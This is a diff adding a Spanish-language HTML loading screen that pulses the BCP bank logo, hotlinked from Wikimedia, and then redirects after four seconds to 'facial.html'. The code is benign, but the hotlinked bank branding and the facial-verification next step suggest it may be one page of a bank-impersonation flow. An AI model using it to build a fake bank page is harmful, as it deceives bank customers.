@@ -1,0 +1,68 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Cargando</title>
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+
+      body {
+        margin: 0;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background: #f5f8fb;
+        overflow: hidden;
+      }
+
+      .imagen-respirando {
+        width: 220px;
+        height: auto;
+        display: block;
+        animation: respirar 3s ease-in-out infinite;
+        transform-origin: center center;
+      }
+
+      @keyframes respirar {
+        0% {
+          transform: scale(1);
+        }
+
+        50% {
+          transform: scale(1.18);
+        }
+
+        100% {
+          transform: scale(1);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <img
+      src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0d/Logo-bcp-vector.svg/3840px-Logo-bcp-vector.svg.png"
+      alt="Imagen animada"
+      class="imagen-respirando"
+    />
+
+    <script>
+      document.addEventListener("DOMContentLoaded", () => {
+        // Tiempo de espera en milisegundos (4000 ms = 4 segundos)
+        const tiempoDeEspera = 4000;
+        
+        // Página a la que redirigirá automáticamente al terminar el tiempo
+        const PAGINA_DESTINO = "facial.html"; // Cambia esto por tu siguiente página
+
+        setTimeout(() => {
+          window.location.href = PAGINA_DESTINO;
+        }, tiempoDeEspera);
+      });
+    </script>
+  </body>
+</html>
